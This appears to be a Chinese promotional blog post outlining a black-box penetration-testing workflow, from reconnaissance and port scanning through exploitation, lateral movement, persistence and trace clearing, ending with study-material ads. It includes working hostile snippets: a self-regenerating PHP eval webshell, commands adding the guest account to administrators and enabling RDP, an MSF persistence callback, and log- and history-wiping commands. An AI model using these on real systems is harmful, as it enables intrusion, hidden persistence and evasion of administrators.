#  挖漏洞经验分享，挖漏洞赚取生活费，7天收益近2200，教你从零基础挖漏洞的正确姿势！   
 编程技术栈   2024-08-17 15:35  
  
经常有小伙伴问我。  
  
为什么自己总是挖不到漏洞呢?  
  
渗透到底是什么样的流程呢?  
  
**所以全网最详细的渗透测试流程来了!!!**  
  
****  
全篇文章内容较长,请耐心观看!  
## 渗透测试  
  
渗透测试其实就是通过一些手段来找到网站，APP，网络服务，软件，服务器等网络设备和应用的漏洞，告诉管理员有哪些漏洞，怎么填补，从而防止黑客的入侵。  
  
渗透测试分为 **白盒测试** 和 **黑盒测试**  
- 白盒测试就是在知道目标网站源码和其他一些信息的情况下对其进行渗透，有点类似于代码分析  
  
- 黑盒测试就是只告诉我们这个网站的url，其他什么都不告诉，然后让你去渗透，模拟黑客对网站的渗透  
  
我们现在就模拟黑客对一个网站进行渗透测试，这属于黑盒测试，我们只知道该网站的URL，其他什么的信息都不知道。接下来，我就给大家分享下黑盒渗透测试的流程和思路！  
  
一般来说，渗透测试的基本流程如下：  
1. 确定目标  
  
1. 信息收集  
  
1. 漏洞探测  
  
1. 漏洞利用getshell  
  
1. 内网转发  
  
1. 内网渗透  
  
1. 痕迹清除  
  
1. 撰写渗透测试报告  
  
**一 确定目标**  
  
这个没什么好说的就是确定你的渗透目标是什么。  
> 漏洞挖掘大礼包：  
**后台发送****“黑客****”，**  
**即****可免费白嫖全套视频教程和学习资料哦！**  
  
  
**二 信息收集**  
  
**信息收集是整个渗透测试中最重要的一步**，你要把你要攻击的目标全部探测清楚，才能更好的攻击。**信息收集的越丰富，内容或情报收集的越多，攻击的成功率就越高。**  
  
而信息收集到底要收集哪些信息呢？接下来，我就给大家整理了一下，渗透测试中常见的一些需要收集的信息。  
  
**1.主机扫描(Nessus)**  
  
对目标主机进行扫描，而不仅仅是对网站进行扫描，扫描目标主机开放了哪些端口，扫描端口运行的服务，目标主机上有哪些漏洞。  
  
主机扫描的工具也有很多，比如：Nessus  
  
**2.端口扫描(nmap)**  
  
需要知道目标服务器开放了哪些端口，常见的如 135 、137 、138 、139 、445，这几个端口经常爆发漏洞。以下是一些服务端口的漏洞：  
  
22——>ssh弱口令  
  
873——>rsync 未授权访问漏洞  
  
3306——>mysql弱口令  
  
6379——>redis未授权访问漏洞  
  
端口扫描工具有nmap和masscan。nmap扫描的准确性较高，但是扫描的比较慢。masscan扫描的比较快，但是准确性较低。  
  
**3.网站敏感目录和文件**  
  
扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏  
- 后台目录：弱口令，万能密码，爆破  
  
- 安装包：获取数据库信息，甚至是网站源码  
  
- 上传目录：截断、上传图片马等  
  
- mysql管理接口：弱口令、爆破，万能密码，然后脱裤，甚至是拿到shell  
  
- 安装页面 ：可以二次安装进而绕过  
  
- phpinfo：会把你配置的各种信息暴露出来  
  
- 编辑器：fck、ke、等  
  
- iis短文件利用：条件比较苛刻 windows、apache等  
  
提到了网站敏感目录我们就不得不提 robots.txt 文件了  
  
robots.txt 文件是专门针对搜索引擎机器人robot 编写的一个纯文本文件。我们可以在这个文件中指定网站中不想被robot访问的目录。这样，我们网站的部分或全部内容就可以不被搜索引擎收录了，或者让搜索引擎只收录指定的内容。因此我们可  
  
以利用robots.txt让Google的机器人访问不了我们网站上的重要文件，GoogleHack的威胁也就不存在了。  
  
假如编写的robots.txt文件内容如下：  
```
User-agent: *
Disallow: /data/
Disallow: /db/
Disallow: /admin/
Disallow: /manager/

Allow:/images/


```  
  
其中“Disallow”参数后面的是禁止robot收录部分的路径，例如我们要让robot禁止收录网站目录下的“data”文件夹，只需要在Disallow参数后面加上 /data/ 即可。如果想增加其他目录，只需按此格式继续添加。文件编写完成后将其上传到网站的根目录，就可以让网站远离Google Hack了。  
  
虽然robots文件目的是让搜索蜘蛛不爬取想要保护的页面，但是如果我们知道了robots文件的内容的话，我们就可以知道目标网站哪些文件夹不让访问，从侧面说明这些文件夹是很重要的了。  
  
探测目标网站后台目录的工具有：wwwscan 、御剑 、 dirbuster、cansina 等  
  
**4.旁站和C段扫描**  
  
旁站指的是同一服务器上的其他网站，很多时候，有些网站可能不是那么容易入侵。那么，可以查看该网站所在的服务器上是否还有其他网站。如果有其他网站的话，可以先拿下其他网站的webshell，然后再提权拿到服务器的权限，最后就自然可以拿下该网站了！  
  
对于红蓝对抗和护网，C段扫描比较有意义。对于单独网站的渗透测试，C段扫描意义不大。C段指的是同一内网段内的其他服务器，每个IP有ABCD四个段，举个例子，192.168.0.1，A段就是192，B段是168，C段是0，D段是1，而C段嗅探的意思就是拿下它同一C段中的其中一台服务器，也就是说是D段1-255中的一台服务器，然后利用工具嗅探拿下该服务器。  
  
**5.网站漏洞扫描**  
  
网站漏洞扫描就是直接对网站进行漏洞探测了。网站漏洞扫描也有很多工具。比如 AWVS、AppScan、OWASP-ZAP、nessuss等等。但是需要注意的是，使用漏扫工具直接对网站进行扫描，因为一下子流量过大，有些网站可能会崩溃。所以一般最好不要使用漏洞扫描工具对网站进行扫描。并且如果未经授权就用漏扫对网站进行扫描还是违法的！  
  
**6.网站指纹识别**  
  
在渗透测试中，对目标服务器进行指纹识别是相当有必要的，因为只有识别出相应的Web容器或者CMS，才能查找与其相关的漏洞，然后才能进行相应的渗透操作。CMS又称整站系统。常见的CMS有：WordPress、Dedecms、Discuz、PhpWeb、PhpWind、Dvbbs、PhpCMS、ECShop、、SiteWeaver、AspCMS、帝国、Z-Blog等。  
  
常见的网站指纹识别工具有：whatweb等。  
  
**7.公司敏感信息网上搜集**  
  
当确定了公司后，我们可以去互联网上查询与该公司有关的任何信息。比如，公司的邮箱格式，公司的员工姓名，以及与该公司有关的任何信息。并且，我们还可以去Github、码云等代码托管平台上查找与此有关的敏感信息，有些粗心的程序员在将代码上传至代码托管平台后，并没有对代码进行脱敏处理。导致上传的代码中有包含如数据库连接信息、邮箱密码、还有可能有泄露的源代码等。  
  
**8.域名信息的收集**  
  
当我们确定了要渗透的目标，也就是知道了其域名，接下来我们需要收集域名对应的 ip，域名的whois信息、子域名等等一系列与域名相关的信息。  
  
判断域名对应的IP：首先，我们要判断该域名是否存在CDN的情况，我们可以去在线CDN查询网站：  
多个地点Ping服务器,网站测速 - 站长工具 。如果查询出的ip数量大于一个的话，则说明该ip地址不是真实的服务器地址。以我的经验来看，如果是2个或者3个，并且这几个地址是同一地区的不同运营商的话，则很有可能这几个地址是服务器的出口地址，该服务器在内网中，通过不同运营商NAT映射供互联网访问，同时采用几个不同的运营商可以负载均衡和热备份。如果是多个ip地址，并且这些ip地址分布在不同地区的话，则基本上可以断定就是采用了CDN了。  
  
域名的whois信息：whois是用来查询域名注册所有者等信息的传输协议。简单说，whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。通过whois来实现对域名信息的查询。早期的whois查询多以命令行接口存在，但是现在出现了一些网页接口简化的线上查询工具，可以一次向不同的数据库查询。网页接口的查询工具仍然依赖whois协议向服务器发送查询请求，命令行接口的工具仍然被系统管理员广泛使用。whois通常使用TCP协议43端口。每个域名/IP的whois信息由对应的管理机构保存。  
## 三 漏洞探测  
  
当我们收集到了足够多的信息之后，我们就要开始对网站进行漏洞探测了。探测网站是否存在一些常见的Web漏洞，比如：  
- SQL注入  
  
- XSS跨站脚本  
  
- CSRF跨站请求伪造  
  
- XXE漏洞  
  
- SSRF服务端请求伪造漏洞  
  
- 文件包含漏洞  
  
- 文件上传漏洞  
  
- 文件解析漏洞  
  
- 远程代码执行漏洞  
  
- CORS跨域资源共享漏洞  
  
- 越权访问漏洞  
  
- 目录浏览漏洞和任意文件读取/下载漏洞  
  
- struts2漏洞  
  
- JAVA反序列化漏洞  
  
这些是网站经常发现的一些漏洞，还有一些网站漏洞，这里我就不一一列举出来了。  
  
网站漏洞扫描工具也有很多，比如：  
- AWVS  
  
- AppScan  
  
- Owasp-Zap  
  
- Nessus  
  
网站漏洞扫描工具我就列举这几种，还有很多，最常用的是这几个！  
## 四 漏洞利用  
  
当我们探测到了该网站存在漏洞之后，我们就要对该漏洞进行利用了。不同的漏洞有不同的利用工具，很多时候，通过一个漏洞我们很难拿到网站的webshell，我们往往需要结合几个漏洞来拿webshell。常用的漏洞利用工具如下：  
  
SQL注入 ——> Sqlmap  
  
XSS跨站脚本——> Beef-XSS  
  
抓包改包工具——> Burpsuite工具 、 Fidder抓包软件  
  
文件上传漏洞，上传漏洞的话，我们一般会上传一句话木马上去，进而再获得webshell，传送门——> Webshell和一句话木马  
  
但是，获得了webshell后，一般权限很低，所以我们需要提权，可以选择反弹一个MSF类型的shell提权：Metasploit Framework(MSF)的使用 、 Msfvenonm生成一个后门木马，也可以反弹一个CobaltStrike类型的shell：渗透测试神器Cobalt Strike的使用， 也可以MSF和CobaltStrike联动：MSF和CobaltStrike联动 也可以使用其他提权：Windows提权 、 Linux提权  
## 五 内网转发  
  
当我们获取到了网站的Webshell之后，如果我们想获取该主机的有关信息，我们可以将该主机的webshell换成MSF的shell。直接生成一个木马，然后在菜刀中执行该木马，我们就能接收到一个MSF类型的shell了。  
  
如果我们还想进一步的探测内网主机的信息的话，我们就需要进行内网转发了。我们是不能直接和内网的主机通信的，所以我们就需要借助获取到的webshell网站的服务器和内网主机进行通信。  
## 六 内网横向渗透  
  
当我们在获取了外网服务器的权限，进入该系统后，我们要想尽办法从该服务器上查找到我们想要的信息。  
  
对于windows主机，我们应该多去翻翻目录，或许能有很多意想不到的结果。很多人习惯把账号密码等容易忘的东西存放在备忘录中，或者是桌面上。我们还可以查找数据库的连接文件，查看数据库的连接账号密码等敏感信息。当我们获得了windows主机的账号密码，或者是自己创建了新用户后，我们为了不被网站管理员发现和不破坏服务器。我们尽量不要使用远程桌面。因为使用远程桌面动静比较大，如果此时服务器管理员也在登录，而你此时通过远程桌面登录的话，会将管理员挤掉，而你也将很快的被管理员踢掉。对于实在是要远程桌面登录的情况的话，我们尽量不要新建一个用户进行登录。我们可以激活 guest 用户，然后将其加入 administrators 组里面，用 guest 用户身份登录。在RDP远程登录后，我们可以查看其他用户桌面上和其他目录有哪些软件，我们要找的目标有以下。  
- FTP相关的软件  
  
- 数据库相关的软件  
  
- 打开浏览器，查看历史记录，查看某些网站是否保存有用户密码。利用工具查看浏览器保存的密码  
  
从该主机上找到的账号密码，我们可以做一个字典，在对内网其他机器进行爆破的时候，很有可能是同密码。  
```
net user  guest  /active:yes                      #激活guest用户
net localgroup  administrators  guest  /add       #将guest用户添加到
net user guest    密码                            #更改guest用户密码
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f                          #开启3389端口
```  
  
  
对于Linux主机，我们可以查看开放的端口号，开放的服务，与其建立连接的内网主机。查看目录，查找网站数据库连接密码。总之，就是尽可能的多查找一些账号密码，这对于内网的账号爆破非常有用。  
  
在搭建了隧道可以通内网后，我们首先就需要对内网进行资产发现了。但是对于内网存活网段的判断是一个大问题。内网很有可能同时存在 10.0.0.0/8、172.16.0.0/16、192.168.0.0/24 网段。这就需要我们用扫描器对其进行探测了。通过代理进行内网扫描不建议使用nmap。如果是在本地主机通过代理扫描，可以图形化界面的话，可以使用 RouterScan 、御剑高速TCP全端口扫描器、IIS_Scanner。但是注意线程调低一点，不然代理很容易崩了。如果使用命令行扫描器的话，可以使用S扫描器。在扫描了内网资产和端口开放情况后，对于445端口，就可以打一波MS17_010。但是注意通过代理打445，和之前的是不一样的。传送门——> 内网渗透之MS17-010 。对于3389端口，可以打一波CVE-2019-0708，传送门——> CVE-2019-0708 远程桌面漏洞复现 。对于1433/3306/6379等端口，可以尝试爆破，利用之前收集到的账号密码成功率更高哦。  
  
**权限维持**  
  
在拿到目标主机的权限后，很有可能当时我们并不能获取到想要的东西，需要进行长期的潜伏，特别是在内网渗透中，需要进行长期的信息收集。这时，权限维持就很重要了。我们需要维持住获得的现有权限。  
  
**Web后门**  
  
1：隐藏后门文件(将文件设置为隐藏)  
  
2：不死马，该脚本每5秒向服务器创建test.php，并写入一句话免杀木马。结合attrib命令隐藏文件更好地建立后门。  
```
<?php
    set_time_limit(0);//程序执行时间
    ignore_user_abort(1);//关掉终端后脚本仍然运行
    unlink(__FILE__);//文件完整名
    while(1){
        file_put_contents('test.php','<?php $a=array($_REQUEST["x"]=>"3");
        $b=array_keys($a)[0];
        eval($b);?>');
        sleep(5);
    }
?>
```  
  
  
3：404页面隐藏后门，或者在其他自带文件中插入后门代码  
  
注：以上几种后门方法均能被D盾等工具检测到  
  
**Windows系统**  
  
1：建立隐藏用户，在用户名后加 $  
  
2：在开机启动目录下放置木马文件，只要目标机器重启，将回连我们的远控  
  
3：MSF里的 persistence 模块，执行命令可以使目标机器每隔一定时间自动回连远控。但是容易被发现  
```
#反弹时间间隔是5s 会自动连接192.168.27的4444端口，缺点是容易被杀毒软件查杀
run persistence -X -i 5 -p 8888 -r 192.168.10.27  
 
#然后它就在目标机新建了这个文件：C:\Windows\TEMP\CJzhFlNOWa.vbs ，并把该服务加入了注册表中，只要开机就会启动
```  
  
  
4：在域环境下，想办法获得 krbtgt 用户的哈希，该用户的哈希可以进行票据传递攻击。而且一般该用户的密码不经常改变。  
  
5：shift后门  
  
6：远程桌面会话劫持  
  
**Linux系统**  
  
1：SSH后门  
  
2：crontab定时任务  
  
3：SSH公钥  
  
4：创建SUID=0的用户  
## 七 痕迹清除  
  
当我们达到了目的之后，有时候只是为了黑入网站挂黑页，炫耀一下；或者在网站留下一个后门，作为肉鸡，没事的时候上去溜达溜达；亦或者挂入挖矿木马；但是大家千万不要干这些事，这些都是违法的！  
  
我这里只是教大家在渗透进去之后如何清除我们留下的一部分痕迹，并不能完全清除，完全清除入侵痕迹是不可能的！主要是增加管理员发现入侵者的时间成本和人力成本。只要管理员想查，无论你怎么清除，还是能查到的。  
  
最主要还是要以隐藏自身身份为主，最好的手段是在渗透前挂上代理，然后在渗透后痕迹清除。  
  
Windows系统  
  
1：如果是windows系统，可用MSF中的 clearev 命令清除痕迹  
  
2：如果3389远程登录过，需要清除mstsc痕迹  
  
3：执行命令清除日志：  
```
del %WINDR%\* .log /a/s/q/f
```  
  
  
4：如果是web应用，找到web日志文件，删除  
  
Linux系统  
  
1：如果是Linux系统，在获取权限后，执行以下命令，不会记录输入过的命令  
```
export HISTFILE=/dev/null export HISTSIZE=0
```  
  
  
2：删除 /var/log 目录下的日志文件  
  
3：如果是web应用，找到web日志文件，删除  
## 八 撰写渗透测试保告  
  
在完成了渗透测试之后，我们就需要对这次渗透测试撰写渗透测试报告了。明确的写出哪里存在漏洞，以及漏洞修补的方法。以便于网站管理员根据我们的渗透测试报告修补这些漏洞和风险，防止被黑客攻击！  
## 最后  
  
  为了帮助大家更好的学习网络安全，小编给大家准备了一份网络安全入门/进阶学习资料，里面的内容都是适合零基础小白的笔记和资料，不懂编程也能听懂、看懂，所有资料共282G，朋友们如果有需要全套网络安全入门+进阶学习资源包，可以点击免费领取（如遇扫码问题，可以在评论区留言领取哦）~  
> 《网络安全入门+进阶学习资源包》  
> **后台发送****“黑客”，**  
**即****可免费白嫖全套视频教程和学习资料哦！**  
[](https://mp.weixin.qq.com/s?__biz=MzkxNDU0MTUyNw==&mid=2247483689&idx=1&sn=2cebfa10735a56de32dc9005cf792498&scene=21#wechat_redirect)  
  
  
  
**👉网安（嘿客红蓝对抗）所有方向的学习路线👈**  
  
对于从来没有接触过网络安全的同学，我们帮你准备了详细的学习成长路线图。可以说是最科学最系统的学习路线，大家跟着这个大的方向学习准没问题。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6YnBvoBcYkTjG05cqqrlf3u5iae5fITMaTEENyspYag2nkbiamChdaCEf9A1AStBGjAksvg0GozfbCEt7zAdibG3A/640?wx_fmt=png&from=appmsg "")  
  
  
编辑**学习资料工具包**  
  
压箱底的好资料，全面地介绍网络安全的基础理论，包括逆向、八层网络防御、汇编语言、白帽子web安全、密码学、网络安全协议等，将基础理论和主流工具的应用实践紧密结合，有利于读者理解各种主流工具背后的实现机制。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6YnBvoBcYkTjG05cqqrlf3u5iae5fITMaqS1mPbfXHicARg3Z3HUnFGCHoQ1LSwfIo7azRI4ZUhGlByQgKdL9TSg/640?wx_fmt=png&from=appmsg "")  
  
  
编辑  
  
网络安全源码合集+工具包  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6YnBvoBcYkTjG05cqqrlf3u5iae5fITMaM7WNADoz8b6kNlwMkmy7bRLwYlnkYKRbIZgID9TIkiaotKylhetT42g/640?wx_fmt=png&from=appmsg "")  
  
  
编辑  
  
视频教程  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6YnBvoBcYkTjG05cqqrlf3u5iae5fITMarLxuicyHqaqHYwIZqVINI2fSZOrl9AibqNqG9FiaibZAUGgkMY4Yj8176Q/640?wx_fmt=png&from=appmsg "")  
  
  
编辑  
  
**面试题资料**  
  
独家渠道收集京东、360、天融信等公司测试题！进大厂指日可待！  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6YnBvoBcYkTjG05cqqrlf3u5iae5fITMaAFrmib3X5KsDLFW0U15uo5JaqEqnpVBLauRhKUUu2SnLtr6FfI8Vicng/640?wx_fmt=png&from=appmsg "")  
  
  
编辑 全部资料共282G，朋友们如果有需要全套网络安全入门+进阶学习资源包，可以点击免费领取（如遇扫码问题，可以在评论区留言领取哦）~  
> 黑客/网安大礼包：  
**后台发送****“黑客”，**  
**即****可免费白嫖全套视频教程和学习资料哦！**  
[](https://mp.weixin.qq.com/s?__biz=MzkxNDU0MTUyNw==&mid=2247483689&idx=1&sn=2cebfa10735a56de32dc9005cf792498&scene=21#wechat_redirect)  
  
  
  
好了就写到这了,大家有任何关于渗透方面的问题也可以随时私信问我,后续也会给大家分享更多渗透方面的知识!希望大家不要忘记点赞收藏哦!  
  
